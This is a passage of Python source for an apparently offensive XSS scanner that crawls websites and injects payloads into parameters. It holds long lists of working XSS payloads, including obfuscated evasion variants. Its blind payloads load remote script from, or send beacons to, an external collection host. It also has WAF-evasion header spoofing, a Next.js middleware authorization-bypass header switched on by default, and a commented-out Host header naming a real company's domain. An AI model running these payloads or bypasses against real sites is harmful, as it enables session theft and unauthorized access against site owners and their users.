#!/usr/bin/env python3
"""
Next-Gen MetaX Scanner - Advanced Edition

Improvements in this version:
- Extended and modernized payloads (including advanced Web API-based payloads).
- Enhanced scoring system that now factors in advanced payload triggers.
- Robust browser verification with better concurrency and logging.
- Modular design with clear type hints and helper functions.
"""

import sys, os, re, json, time, random, logging, asyncio, difflib, html, socket, argparse, hashlib, warnings
from pathlib import Path
from urllib.parse import urlparse, urljoin, parse_qsl, urlunparse, urlencode
from typing import Any, Dict, List, Tuple, Optional, Set, Callable, Union
import aiohttp
from aiohttp import ClientTimeout, TCPConnector
from aiohttp.abc import AbstractResolver
import validators, psutil
from bs4 import BeautifulSoup, XMLParsedAsHTMLWarning
import importlib
from collections import OrderedDict

# --- Use lxml if available for faster parsing ---
try:
    import lxml  # noqa: F401
    BS_PARSER = "lxml"
except ImportError:
    BS_PARSER = "html.parser"

from playwright.async_api import async_playwright
from rich.console import Console
from rich.progress import Progress, SpinnerColumn, BarColumn, TimeElapsedColumn, TimeRemainingColumn, TextColumn
from rich.panel import Panel
from rich.prompt import Prompt
from rich.table import Table
from rich.theme import Theme

# --- Suppress unnecessary warnings ---
warnings.filterwarnings("ignore", category=XMLParsedAsHTMLWarning)

# --- Global Configuration ---
CF: Dict[str, Any] = {
    "max_concurrency": 800,
    "browser_concurrency": 100,
    "adaptive_throttle": True,
    "base_timeout": 1.0,
    "max_retries": 1,
    "browser_timeout": 15,
    "browser_wait": 1.5,
    "payload_randomization": True,
    "score_filter": 40,
    "baseline_samples": 3,
    "baseline_retries": 3,
    "cache_ttl": 300,
    "max_cache_size": 1000,
    "reflection_threshold": 0.8,
    "concurrent_requests": 10,
    "debug_mode": False,
    "baseline_delay": 0.1,
    "max_payloads_per_param": 20,
    "browser_retry_attempts": 2,
    "browser_passes": 3,
    "required_success_rate": 1.0,
    "browser_batch_size": 10,
    "enable_gc_during_verification": False,
    "use_dom_parser": True,
    "fingerprint_cache_size": 100,
    "verification_enabled": True,
    "require_verification": True,
    "blacklist_patterns": [r"login", r"logout", r"delete", r"remove"],
    "content_type_patterns": {
        "html": r"text/html|application/xhtml\+xml",
        "json": r"application/json|text/json",
        "xml": r"application/xml|text/xml",
        "javascript": r"application/javascript|text/javascript",
        "plain": r"text/plain"
    },
    "browser_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/96.0.4664.110 Safari/537.36",
    "viewport": {"width": 1280, "height": 800},
    "output_dir": "results_metax_advanced",
    "realtime_file": "metax_scan_realtime.json",
    "waf_evasion": False,
    "nextjs_bypass": True,
    "nextjs_bypass_payload": "middleware:middleware:middleware:middleware:middleware",
    "browser_type": "chromium",
    "scan_mode": "comprehensive",
    "sandbox_verification": True,
    "dashboard_enabled": False,
    "crawl_depth": 3
}

def validate_config(config: Dict[str, Any]) -> None:
    required_keys = ["max_concurrency", "cache_ttl", "output_dir", "browser_type", "scan_mode"]
    for key in required_keys:
        if key not in config:
            raise ValueError(f"Missing required config key: {key}")

validate_config(CF)
Path(CF.get("output_dir")).mkdir(exist_ok=True)

# --- Improved UI Theme & Console ---
custom_theme = Theme({
    "info": "bold bright_cyan",
    "success": "bold bright_green",
    "warning": "bold yellow",
    "error": "bold red",
    "step": "bold magenta",
    "param": "italic bright_blue",
    "highlight": "bold bright_yellow",
    "critical": "bold white on red",
    "debug": "dim white",
    "menu": "bold bright_magenta",
    "primary": "bold bright_magenta"
})
console = Console(theme=custom_theme)
logging.basicConfig(level=logging.DEBUG if CF.get("debug_mode") else logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger("metax_advanced")

def timestamped_file(prefix: str, ext: str = "json") -> Path:
    return Path(CF.get("output_dir")) / f"{prefix}_{time.strftime('%Y%m%d_%H%M%S')}.{ext}"

def is_interesting(url: str) -> bool:
    try:
        static_ext = [".js", ".css", ".jpg", ".jpeg", ".png", ".gif", ".ico", ".pdf", ".zip", ".mp4", ".mp3"]
        return not any(urlparse(url).path.lower().endswith(ext) for ext in static_ext)
    except Exception:
        return False

# --- Advanced Detection Logic ---
class AdvancedSmartDetection:
    @staticmethod
    def analyze_context(html_content: str) -> Dict[str, Any]:
        triggers = ["alert(", "confirm(", "prompt(", "onerror=", "onload=", "javascript:", "onmouseover=", "onfocus=", "onresize="]
        trigger_count = sum(html_content.lower().count(trigger) for trigger in triggers)
        confidence = min(1.0, trigger_count / 3.0) if trigger_count > 0 else 0.0
        return {"confidence": confidence, "trigger_count": trigger_count}

    @staticmethod
    def reduce_false_positives(score: int, metadata: Dict[str, Any]) -> int:
        if "generic" in metadata.get("payload", "").lower():
            score = int(score * 0.9)
        if score < 20:
            score = 0
        return score

# --- Plugin Manager ---
class PluginManager:
    def __init__(self, plugins_dir: str = "plugins") -> None:
        self.plugins: List[Callable[[Any], Any]] = []
        self.plugins_dir = plugins_dir
        self.load_plugins()

    def load_plugins(self) -> None:
        if not os.path.isdir(self.plugins_dir):
            return
        for file in os.listdir(self.plugins_dir):
            if file.endswith(".py"):
                try:
                    module_name = file[:-3]
                    spec = importlib.util.spec_from_file_location(module_name, os.path.join(self.plugins_dir, file))
                    module = importlib.util.module_from_spec(spec)
                    spec.loader.exec_module(module)
                    if hasattr(module, "run"):
                        self.plugins.append(module.run)
                except Exception as e:
                    logger.error(f"Plugin error in {file}: {e}")

    def run_plugins(self, vuln_result: "VulnResult") -> None:
        for plugin in self.plugins:
            try:
                plugin(vuln_result)
            except Exception as e:
                logger.error(f"Plugin error during execution: {e}")

# --- Builtin Resolver ---
class BuiltinResolver(AbstractResolver):
    async def resolve(self, host: str, port: int = 0, family: int = socket.AF_INET) -> List[Dict[str, Any]]:
        loop = asyncio.get_running_loop()
        infos = await loop.getaddrinfo(host, port, type=socket.SOCK_STREAM, family=family, proto=0, flags=socket.AI_ADDRCONFIG)
        return [{"hostname": host, "host": a[0], "port": a[1], "family": fam, "proto": pr, "flags": 0} for (fam, _, pr, _, a) in infos]
    async def close(self) -> None:
        pass

# --- Payload Manager ---
class PayloadManager:
    """
    Provides various XSS payloads (base, advanced, context-aware, blind, and path) with randomization.
    """
    BASE_PAYLOADS: List[str] = [
    # Logic-based and modern evasion payloads
    '"><svg/onload=k=alert,k(\'MetaX_{rand}\')>',
    '"><script>Function("al"+"ert(MetaX_{rand})")()</script>',
    '"><script>setTimeout`al\\x65rt(MetaX_{rand})`</script>',
    'javascript:/*--><svg/onload=alert(MetaX_{rand})>//-->',
    '"><img src=x onerror=alert(MetaX_{rand})>',
    '"><svg><script xlink:href="data:text/javascript,alert(MetaX_{rand})"></script></svg>',
    '"><script>eval(String.fromCharCode(97,108,101,114,116,40,MetaX_{rand},41))</script>',
    '"><script>`${alert(MetaX_{rand})}`</script>',
    '{"x":"</script><script>alert(MetaX_{rand})</script>"}',
    '"><iframe srcdoc="<script>alert(MetaX_{rand})</script>">',

    # JS logic-chain based payloads (URL encoded)
    '%22%3E%27-((k=alert)&&k(...[MetaX_{rand}]))-%27',
    '%22%3E%27-((k=alert)=>k(MetaX_{rand}))()-%27',
    '%22%3E%27-(+!k&&k=alert,k(MetaX_{rand}))-%27',
    '%22%3E%27-(0,k=alert,k?.(MetaX_{rand}))-%27',
    '%22%3E%27-((k=alert).bind``(MetaX_{rand}))-%27',
    '%22%3E%27-(f=Function,f(\'al\'+\'ert(MetaX_{rand})\')())-%27',
    '%22%3E%27-(a=>a(MetaX_{rand}))(k=alert)-%27',
    '%22%3E%27-((k=alert),`${k(MetaX_{rand})}`)-%27',
    '%22%3E%27-(k=\\u0061lert,k(MetaX_{rand}))-%27',
    '%22%3E%27-(k=String.raw,k=alert,k`MetaX_{rand}`)-%27',
    '%22%3E%27-(A=Object.getOwnPropertyDescriptor(window,\'location\').get,A({toString:_=>{k=alert;k(MetaX_{rand})}}))-%27',
    '%22%3E%27-(([k]=[alert],k(MetaX_{rand})))-%27',
    '%22%3E%27-(this )-%27',
    '%22%3E%27-(($={0:alert}) )-%27',
    '%22%3E%27-(Object.defineProperty(this,\'x\',{get:()=>alert(MetaX_{rand})}),x)-%27',
    '%22%3E%27-(URL.createObjectURL(new Blob([\'alert(MetaX_{rand})\'],{type:\'text/javascript\'})))-%27',
    '%22%3E%27-(()=>(f=document.body.appendChild(document.createElement`iframe`),f.srcdoc=\'\'+String.raw`<script>alert(MetaX_{rand})<\\/script>`))()-%27',
    '%22%3E%27-(async()=>{(await\'\'),alert(MetaX_{rand})})()-%27',
    '%22%3E%27-(new Map([[0,alert]])).get(0)(MetaX_{rand})-%27',
    '%22%3E%27-(k=alert,/a/.test({toString:()=>k(MetaX_{rand})}))-%27',
    'Function(\'\\x61\\x6c\\x65\\x72\\x74(MetaX_{rand})\')()',

    # onmouseover payloads
    'onmouseover="(k=alert,k(MetaX_{rand}))"',
    'onmouseover="(()=>alert(MetaX_{rand}))()"',
    'onmouseover="(async()=>{await 0;alert(MetaX_{rand})})()"',
    'onmouseover="({get x(){alert(MetaX_{rand})}}).x"',
    'onmouseover="([a]=[alert],a(MetaX_{rand}))"',
    'onmouseover="`${alert(MetaX_{rand})}`"',
    'onmouseover="(f=Function)(\'al\'+\'ert(MetaX_{rand})\')()"',
    'onmouseover="setTimeout`al\\x65rt(MetaX_{rand})`"',
    'onmouseover="alert.bind``(MetaX_{rand})"',
    'onmouseover="(k=alert,k?.(MetaX_{rand}))"',
    'onmouseover="([][[]]+[])[+!![]]+(k=alert,k(MetaX_{rand}))"',
    '<div onmouseover=alert(MetaX_{rand})>',
    '<div onmouseover=(()=>alert(MetaX_{rand}))()>'
]

    ADVANCED_PAYLOADS: List[str] = [
        # JSON and Attribute Injection Variants
        '{"key": "<svg/onload=alert(\'XSS_{rand}\')>"}',
        '{"callback": "javascript:confirm(\'XSS_{rand}\')"}',
        # HTML5 Event Handlers and Inline Scripting
        '"><a href="#" data-xss="eval(this.dataset.xss)" onclick="prompt(\'XSS_{rand}\')">click</a>',
        '"><video src=x onerror=alert(\'XSS_{rand}\')>',
        '"><audio src=x onerror=alert(\'XSS_{rand}\')>',
        '"><div contenteditable onfocus=alert(\'XSS_{rand}\')>edit me</div>',
        '"><marquee onstart=alert(\'XSS_{rand}\')>scroll</marquee>',
        # Modern Browser DOM Manipulation
        '"><script>document.body.innerHTML=`<img src=x onerror=alert("XSS_{rand}")>`</script>',
        '"><script>fetch("https://xss.report/c/or0to");</script>',
        # Advanced Function-Based Payloads
        '"><script>((x)=>{ window.location.href=`javascript:alert("${x}")` })("XSS_{rand}")</script>',
        '"><script>Promise.resolve().then(()=>alert("XSS_{rand}"))</script>',
        # Event Handling Variations
        '"><span onmouseover="alert(\'XSS_{rand}\')">hover me</span>',
        '"><div onmouseenter="alert(\'XSS_{rand}\')">mouse enter</div>',
        # Advanced SVG and Character Encoding Techniques
        '"><svg/onload=alert(String.fromCharCode(88,83,83,95,{rand}))>',
        '"><img src=x onerror=prompt(String.fromCharCode(88,83,83,95,{rand}))>',
        # Modern HTML5 and Web API Exploits
        '"><iframe srcdoc="<script>alert(\'XSS_{rand}\')</script>">',
        '"><object data="javascript:alert(\'XSS_{rand}\')">',
        '"><embed src="javascript:alert(\'XSS_{rand}\')">',
        # CSS and Style-Based Injection
        '"><style>@import url("javascript:alert(\'XSS_{rand}\')");</style>',
        '"><link rel="stylesheet" href="data:text/css;base64,YSB7IGFsZXJ0KCdYU1NfcmFuZCcpIH0=">',
        # SVG and XML-Based Injections
        '"><svg><script>alert(\'XSS_{rand}\')</script>',
        '"><svg><desc><![CDATA[</desc><script>alert(\'XSS_{rand}\')]</script>',
        # HTML5 Custom Elements and Shadow DOM
        '"><custom-element onclick="alert(\'XSS_{rand}\')">Click Me</custom-element>',
        # Modern Web API Exploits
        '"><script>navigator.sendBeacon("https://xss.report/c/or0to", "payload=XSS_{rand}");</script>',
        # Mutation Observer and Dynamic Script Injection
        '"><script>new MutationObserver(()=>alert("XSS_{rand}")).observe(document.body,{childList:true})</script>',
        # Exotic Escape and Encoding Techniques
        '"><script>eval(decodeURIComponent("%61%6C%65%72%74%28%27%58%53%53%5F%72%61%6E%64%27%29"))</script>',
        # WebRTC and Advanced Communication Channel Payloads
        '"><script>RTCPeerConnection && new RTCPeerConnection().createDataChannel("xss").send("XSS_{rand}")</script>'
        ]
    CONTEXT_PAYLOADS: Dict[str, List[str]] = {
        "html": [
            '"><script>alert(\'MetaX_{rand}\')</script>',
            '"><svg/onload=alert(\'MetaX_{rand}\')>',
            '"><img src=x onerror=alert(\'MetaX_{rand}\')>',
            '`"><script>eval(`alert("MetaX_{rand}")`);</script>',
            '"><!--<script>alert(\'MetaX_{rand}\')</script>-->',
            '"><b onmouseover=alert(\'MetaX_{rand}\')>test</b>',
            '"><a href="#" onclick="alert(\'MetaX_{rand}\')">click</a>',
            '"><div style="background-image: url(javascript:alert(\'MetaX_{rand}\'));">'
        ],
        "href": [
            'javascript:alert(\'MetaX_{rand}\')',
            'data:text/html,<script>alert("MetaX_{rand}")</script>',
            'vbscript:msgbox("MetaX_{rand}")',
            'javascript:confirm(\'MetaX_{rand}\')',
            'data:text/html;base64,PHNjcmlwdD5hbGVydCgnTWV0YVhfJyk8L3NjcmlwdD4=',
            'javascript:prompt(\'MetaX_{rand}\')',
            'javascript:window.location="javascript:alert(\'MetaX_{rand}\')"'
        ]
    }
    BLIND_PAYLOADS: List[str] = [
        '\'"><script src="https://xss.report/c/or0to"></script>',
        '"><img src=x id="dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL29yMHRvIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw==" onerror=eval(atob(this.id))>',
        'javascript:eval(\'var a=document.createElement("script");a.src="https://xss.report/c/or0to";document.body.appendChild(a)\')',
        '"><script>fetch("https://xss.report/c/or0to")</script>',
        '"><iframe src="https://xss.report/c/or0to" style="display:none"></iframe>'
    ]
    PATH_PAYLOADS: List[str] = [
        "javascript:alert('MetaX_{rand}')",
        "data:text/html,<script>alert('MetaX_{rand}')</script>",
        "vbscript:msgbox('MetaX_{rand}')",
        "javascript:confirm('MetaX_{rand}')",
        "javascript:prompt('MetaX_{rand}')",
        "javascript:window.location='javascript:alert(\\'MetaX_{rand}\\')'"
    ]
    
    @staticmethod
    def _replace_rand(payload: str, rand: Optional[str] = None) -> str:
        if rand is None:
            rand = str(random.randint(10000, 99999))
        return payload.replace("{rand}", rand)
    
    @classmethod
    def generate(cls, count: Optional[int] = None) -> List[str]:
        all_payloads = [cls._replace_rand(p) for p in (cls.BASE_PAYLOADS + cls.ADVANCED_PAYLOADS)]
        if CF.get("payload_randomization"):
            random.shuffle(all_payloads)
        if count is not None and count < len(all_payloads):
            return random.sample(all_payloads, count)
        return all_payloads

    @classmethod
    def generate_context_aware(cls, ctx: Optional[Union[str, List[str]]] = None) -> Dict[str, List[str]]:
        if isinstance(ctx, str):
            contexts = [ctx]
        elif isinstance(ctx, list):
            contexts = ctx
        else:
            contexts = list(cls.CONTEXT_PAYLOADS.keys())
        rand = str(random.randint(10000, 99999))
        return {k: [cls._replace_rand(p, rand) for p in cls.CONTEXT_PAYLOADS.get(k, [])] for k in contexts}

    @classmethod
    def get_all_payloads(cls) -> Dict[str, List[str]]:
        return {
            "base": [cls._replace_rand(p) for p in cls.BASE_PAYLOADS],
            "advanced": [cls._replace_rand(p) for p in cls.ADVANCED_PAYLOADS],
            "context": cls.generate_context_aware(),
            "blind": [cls._replace_rand(p) for p in cls.BLIND_PAYLOADS],
            "path": [cls._replace_rand(p) for p in cls.PATH_PAYLOADS]
        }

# --- Browser Hook for DOM Event Logging ---
BROWSER_HOOK = r"""
window.__METAXLOG = [];
(function(){
  function push(msg){ window.__METAXLOG.push(new Date().toISOString()+"-"+msg); }
  window.alert = function(m){ push("alert:"+m); return m; };
  window.confirm = function(m){ push("confirm:"+m); return true; };
  window.prompt = function(m,d){ push("prompt:"+m); return d; };
  new MutationObserver(function(muts){
    muts.forEach(function(m){
      if(m.type==='childList'){
        m.addedNodes.forEach(function(n){
          if(n.nodeName==='SCRIPT') push("script:"+n.textContent.substring(0,100));
        });
      }
    });
  }).observe(document, {childList:true, subtree:true});
  push("metax-monitor-initialized");
})();
"""

# --- Adaptive Scheduler ---
class AdaptiveScheduler:
    @staticmethod
    def concurrency(max_val: int) -> int:
        if not CF.get("adaptive_throttle"):
            return max_val
        cpu = psutil.cpu_percent(interval=0.1)
        mem = psutil.virtual_memory().percent
        try:
            load = psutil.getloadavg()[0]
        except Exception:
            load = 0.0
        cores = psutil.cpu_count() or 1
        factor = 1.0 - ((cpu + mem) / 100) - (0.5 * (load / cores))
        factor = max(0.1, min(1.2, factor))
        return max(1, int(max_val * factor))

# --- LRU Cache using OrderedDict ---
class LRUCache:
    def __init__(self, capacity: int) -> None:
        self.capacity: int = capacity
        self.cache: OrderedDict[Any, Any] = OrderedDict()
    def get(self, key: Any) -> Optional[Any]:
        if key in self.cache:
            self.cache.move_to_end(key)
            return self.cache[key]
        return None
    def set(self, key: Any, value: Any) -> None:
        if key in self.cache:
            self.cache.move_to_end(key)
        self.cache[key] = value
        if len(self.cache) > self.capacity:
            self.cache.popitem(last=False)

# --- DOM Parser ---
class DOMParser:
    def extract_structure(self, html_content: str) -> str:
        try:
            if "<xml" in html_content.lower():
                soup = BeautifulSoup(html_content, features="xml")
            else:
                soup = BeautifulSoup(html_content, BS_PARSER)
            return " ".join(tag.name for tag in soup.find_all())
        except Exception:
            return ""
    def extract_event_handlers(self, html_content: str) -> List[str]:
        soup = BeautifulSoup(html_content, BS_PARSER)
        return [str(tag.attrs) for tag in soup.find_all() if any(attr.lower().startswith("on") for attr in tag.attrs)]
    def heuristic_obfuscation_check(self, html_content: str) -> bool:
        return bool(re.search(r"(\\x|\\u|%[0-9A-Fa-f]{2}){3,}", html_content))

# --- Extended Scoring Engine ---
class ScoreEngine:
    @staticmethod
    def strip_html(text: str) -> str:
        soup = BeautifulSoup(text, BS_PARSER)
        for tag in soup(["script", "style", "noscript", "iframe", "svg", "img", "object", "embed", "form", "input", "button", "textarea"]):
            tag.decompose()
        return soup.get_text(separator=" ", strip=True)
    
    @staticmethod
    def check_encodings(payload: str, response: str) -> Dict[str, bool]:
        unescaped_payload = html.unescape(payload)
        return {"raw": payload in response, "unescaped": unescaped_payload in response}

    @staticmethod
    def compute_score(payload: str, baseline: str, response: str, base_latency: float, resp_latency: float) -> Tuple[int, str]:
        norm_payload = payload.strip()
        norm_response = html.unescape(response) if response else ""
        norm_baseline = html.unescape(baseline) if baseline else ""
        comp = {"reflection": 0, "difference": 0, "structure": 0, "context": 0, "event_handler": 0, "heuristic": 0, "latency": 0, "advanced": 0}
        reasons: List[str] = []
        encodings = ScoreEngine.check_encodings(norm_payload, norm_response)
        if encodings.get("raw"):
            comp["reflection"] += 40
            reasons.append("Raw reflection (+40)")
        elif encodings.get("unescaped"):
            comp["reflection"] += 30
            reasons.append("Unescaped reflection (+30)")
        payload_count = norm_response.lower().count(norm_payload.lower())
        if payload_count > 1:
            comp["reflection"] += 10
            reasons.append("Multiple payload reflections (+10)")
        if norm_baseline:
            diff_ratio = difflib.SequenceMatcher(None, norm_baseline, norm_response).ratio()
            diff_score = int((1 - diff_ratio) * 30)
            comp["difference"] += diff_score
            reasons.append(f"HTML Diff (+{diff_score})")
            base_text = ScoreEngine.strip_html(norm_baseline)
            resp_text = ScoreEngine.strip_html(norm_response)
            text_diff = difflib.SequenceMatcher(None, base_text, resp_text).ratio()
            if text_diff < 0.95:
                txt_score = int((1 - text_diff) * 15)
                comp["difference"] += txt_score
                reasons.append(f"Text Diff (+{txt_score})")
            length_delta = abs(len(norm_response) - len(norm_baseline))
            if length_delta > 50:
                bonus = min(10, length_delta // 50)
                comp["difference"] += bonus
                reasons.append(f"Length Delta Bonus (+{bonus})")
        try:
            parser = DOMParser()
            base_structure = parser.extract_structure(norm_baseline)
            resp_structure = parser.extract_structure(norm_response)
            struct_ratio = difflib.SequenceMatcher(None, base_structure, resp_structure).ratio()
            if struct_ratio < 0.95:
                struct_score = int((1 - struct_ratio) * 20)
                comp["structure"] += struct_score
                reasons.append(f"Structure Diff (+{struct_score})")
        except Exception:
            reasons.append("Structure Diff error")
        context_info = AdvancedSmartDetection.analyze_context(norm_response)
        if context_info.get("confidence", 0) > 0.5:
            comp["context"] += 10
            reasons.append("Advanced Context (+10)")
        try:
            event_handlers = DOMParser().extract_event_handlers(norm_response)
            if any(norm_payload.strip('"\'' ) in ev for ev in event_handlers):
                comp["event_handler"] += 15
                reasons.append("Event Handler Detected (+15)")
            if "onmouseover" in norm_payload.lower() and "onmouseover" in norm_response.lower():
                comp["event_handler"] += 5
                reasons.append("Onmouseover bonus (+5)")
        except Exception:
            pass
        if DOMParser().heuristic_obfuscation_check(norm_response):
            comp["heuristic"] += 5
            reasons.append("Heuristic Obfuscation (+5)")
        # New advanced payload check: look for modern API triggers
        advanced_triggers = ["ws:", "sendbeacon", "rtcpeerconnection", "fetch("]
        if any(trigger in norm_response.lower() for trigger in advanced_triggers):
            comp["advanced"] += 10
            reasons.append("Advanced Payload Trigger (+10)")
        latency_delta = resp_latency - base_latency
        if latency_delta > 0.1:
            lat_bonus = min(10, int(latency_delta * 20))
            comp["latency"] += lat_bonus
            reasons.append(f"Latency Delta Bonus (+{lat_bonus})")
        raw_total = sum(comp.values())
        adjusted_total = AdvancedSmartDetection.reduce_false_positives(min(100, raw_total), {"payload": payload})
        reasons.append(f"Total Score: {adjusted_total}")
        return adjusted_total, " | ".join(reasons)

# --- Vulnerability Result Object ---
class VulnResult:
    def __init__(self, url: str, method: str, param: str, payload: str, score: int,
                 xss_token: Optional[str] = None, verified: bool = False, severity: str = "Medium",
                 reason: str = "", pass_count: int = 0, resp_time: float = 0.0) -> None:
        self.url = url
        self.method = method
        self.param = param
        self.payload = payload
        self.score = score
        self.xss_token = xss_token
        self.verified = verified
        self.severity = severity
        self.reason = reason
        self.pass_count = pass_count
        self.resp_time = resp_time
        self.details = {}
        self.reflection_info = {}
        self.trigger_conditions = {}
        self.verification_details = ""
        self.mitigation = "Review sanitization and encoding."

# --- Request Manager ---
class RequestManager:
    UAS: List[str] = [
        "Mozilla/5.0 (Windows NT 10.0; WOW64) Chrome/111 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) Chrome/111 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_2) AppleWebKit/605.1.15 Safari/605.1.15",
        "Mozilla/5.0 (X11; Ubuntu; rv:111.0) Gecko/20100101 Firefox/111.0"
    ]
    def __init__(self) -> None:
        self.sessions: Dict[str, aiohttp.ClientSession] = {}
        self.sem = asyncio.Semaphore(CF.get("concurrent_requests"))
    def get_session(self, domain: str) -> aiohttp.ClientSession:
        if domain not in self.sessions or self.sessions[domain].closed:
            conn = TCPConnector(limit=CF.get("max_concurrency"), ssl=False, resolver=BuiltinResolver())
            self.sessions[domain] = aiohttp.ClientSession(connector=conn)
        return self.sessions[domain]
    @staticmethod
    def shuffle_dict(d: Dict[str, Any]) -> Dict[str, Any]:
        items = list(d.items())
        random.shuffle(items)
        return dict(items)
    @staticmethod
    def shuffle_params(params: List[Tuple[str, str]]) -> List[Tuple[str, str]]:
        random.shuffle(params)
        return params
    async def do_request(self, url: str, method: str = "GET", data: Any = None,
                         extra_headers: Optional[Dict[str, str]] = None, cookies: Any = None,
                         follow_redirects: bool = True) -> Tuple[int, Optional[str], Dict[str, str], float]:
        domain = urlparse(url).netloc
        sess = self.get_session(domain)
        headers = {
            "User-Agent": random.choice(self.UAS),
            ##"Host": "e-invoice.watsons.com.my",
            "Accept": "text/html,application/xhtml+xml,*/*;q=0.9"
        }
        if CF.get("waf_evasion"):
            headers.update({
                "X-Requested-With": "XMLHttpRequest",
                "Referer": f"https://{domain}/",
                "Cookie": f"session={random.randint(1000,9999)};locale=en",
                "Cache-Control": "no-cache",
                "X-Forwarded-For": f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
            })
        if CF.get("nextjs_bypass"):
            headers["x-middleware-subrequest"] = CF.get("nextjs_bypass_payload")
        if extra_headers:
            headers.update(extra_headers)
        headers = self.shuffle_dict(headers)
        jar = aiohttp.CookieJar(unsafe=True) if cookies else None
        start = time.perf_counter()
        try:
            async with self.sem, sess.request(method, url, headers=headers, data=data,
                                               timeout=ClientTimeout(total=CF.get("base_timeout")),
                                               cookies=jar, allow_redirects=follow_redirects) as resp:
                try:
                    text = await resp.text(errors="replace")
                except Exception:
                    text = ""
                content_type = resp.headers.get("Content-Type", "")
                if not any(ct in content_type for ct in ["text", "html", "xml"]):
                    text = ""
                duration = time.perf_counter() - start
                return resp.status, text, dict(resp.headers), duration
        except Exception as e:
            logger.debug(f"Request error on {url}: {e}")
            return 0, None, {}, time.perf_counter() - start
    async def close_all(self) -> None:
        for s in self.sessions.values():
            try:
                await s.close()
            except Exception as e:
                logger.debug(f"Session close error: {e}")
    async def __aenter__(self):
        return self
    async def __aexit__(self, exc_type, exc, tb):
        await self.close_all()

async def param_reflection_check(url: str, param: str, marker: str, rm: RequestManager) -> Tuple[bool, Dict[str, Any]]:
    parsed = urlparse(url)
    qs = parse_qsl(parsed.query, keep_blank_values=True)
    new_q = [(k, marker if k == param else v) for k, v in qs]
    new_q = rm.shuffle_params(new_q)
    inj_url = urlunparse(parsed._replace(query=urlencode(new_q)))
    status, resp, _, _ = await rm.do_request(inj_url, "GET")
    if not resp or status in (0, 403):
        return False, {}
    reflected = marker in resp
    return reflected, {"reflected": reflected, "sample": resp[:300]}

def inject_in_url_path(url: str, payload: str) -> str:
    parsed = urlparse(url)
    new_path = parsed.path.rstrip("/") + "/" + payload.lstrip("/")
    return urlunparse(parsed._replace(path=new_path))

# --- Recursive Crawler ---
class Crawler:
    def __init__(self, rm: RequestManager, max_depth: int = 3):
        self.rm = rm
        self.max_depth = max_depth
        self.visited: Set[str] = set()
    async def crawl(self, url: str, depth: int = 0) -> Set[str]:
        results = set()
        if depth > self.max_depth or url in self.visited:
            return results
        self.visited.add(url)
        status, content, _, _ = await self.rm.do_request(url, "GET")
        if not content or status not in range(200, 300):
            return results
        results.add(url)
        soup = BeautifulSoup(content, BS_PARSER)
        for a in soup.find_all("a", href=True):
            abs_link = urljoin(url, a['href'])
            if urlparse(url).netloc == urlparse(abs_link).netloc:
                results.update(await self.crawl(abs_link, depth + 1))
        return results

# --- Main Scanner ---
class XSSScanner:
    def __init__(self) -> None:
        self.payloads: List[str] = PayloadManager.generate()
        self.ctx_payloads: Dict[str, List[str]] = PayloadManager.generate_context_aware()
        self.rm = RequestManager()
        self.cache = LRUCache(CF.get("max_cache_size"))
        self.baseline_retries: int = CF.get("baseline_retries")
        self.dom_parser = DOMParser() if CF.get("use_dom_parser") else None
        self.blacklist: List[str] = CF.get("blacklist_patterns")
        self.plugin_manager = PluginManager()

    def get_cache(self, url: str) -> Optional[Tuple[float, str, Dict[str, Any]]]:
        return self.cache.get(url)

    def set_cache(self, url: str, baseline: str, metadata: Dict[str, Any]) -> None:
        self.cache.set(url, (time.time(), baseline, metadata))

    async def get_baseline(self, url: str) -> Tuple[str, Dict[str, Any], float]:
        cached = self.get_cache(url)
        if cached:
            return cached[1], cached[2], 0.0
        total_samples = CF.get("baseline_samples") + self.baseline_retries
        console.print(f"[info]Acquiring baseline for: [highlight]{url}[/highlight]")
        tasks = [self.rm.do_request(url, "GET") for _ in range(total_samples)]
        responses = await asyncio.gather(*tasks, return_exceptions=True)
        samples, latencies, headers_list = [], [], []
        for res in responses:
            if isinstance(res, Exception):
                continue
            status, resp, headers, latency = res
            if 200 <= status < 300 and resp:
                samples.append(resp)
                latencies.append(latency)
                headers_list.append(headers)
        if not samples:
            console.print(f"[error]No baseline response received for {url}.[/error]")
            return "", {}, 0.0
        samples_sorted = sorted(samples, key=len)
        baseline = samples_sorted[len(samples_sorted) // 2]
        avg_latency = sum(latencies) / len(latencies) if latencies else 0.0
        metadata = {
            "content_type": next((ctype for ctype, pat in CF["content_type_patterns"].items() 
                                   if re.search(pat, headers_list[-1].get("content-type", "").lower())), "html"),
            "avg_response_size": sum(len(s) for s in samples) / len(samples),
            "dynamic_content": 1.0 - (sum(difflib.SequenceMatcher(None, s, baseline).ratio() for s in samples) / len(samples)),
            "fingerprint": hashlib.sha256(baseline.encode()).hexdigest()[:16],
            "timestamp": time.time(),
            "avg_latency": avg_latency
        }
        self.set_cache(url, baseline, metadata)
        console.print(f"[success]Baseline acquired. Avg Latency: {avg_latency:.3f}s[/success]")
        return baseline, metadata, avg_latency

    async def detect_reflections(self, url: str, progress: Progress, task_id: int) -> Dict[str, Dict[str, Any]]:
        parsed = urlparse(url)
        qs = parse_qsl(parsed.query, keep_blank_values=True)
        params = list({k for k, _ in qs})
        reflection_tasks = []
        markers: Dict[str, str] = {}
        for param in params:
            if any(re.search(pat, param, re.IGNORECASE) for pat in self.blacklist):
                logger.debug(f"Skipping param: {param}")
                continue
            marker = f"REF_{random.randint(10000,99999)}_{param}"
            markers[param] = marker
            reflection_tasks.append(param_reflection_check(url, param, marker, self.rm))
        results = await asyncio.gather(*reflection_tasks)
        for _ in params:
            progress.update(task_id, advance=1)
        return {param: {"marker": markers[param], "info": info} for param, (reflected, info) in zip(params, results) if reflected}

    async def inject_params(self, url: str, baseline: str, base_latency: float, refl: Dict[str, Any],
                              metadata: Dict[str, Any], progress: Progress, task_id: int) -> List[VulnResult]:
        parsed = urlparse(url)
        qs = parse_qsl(parsed.query, keep_blank_values=True)
        content_type = metadata.get("content_type", "html")
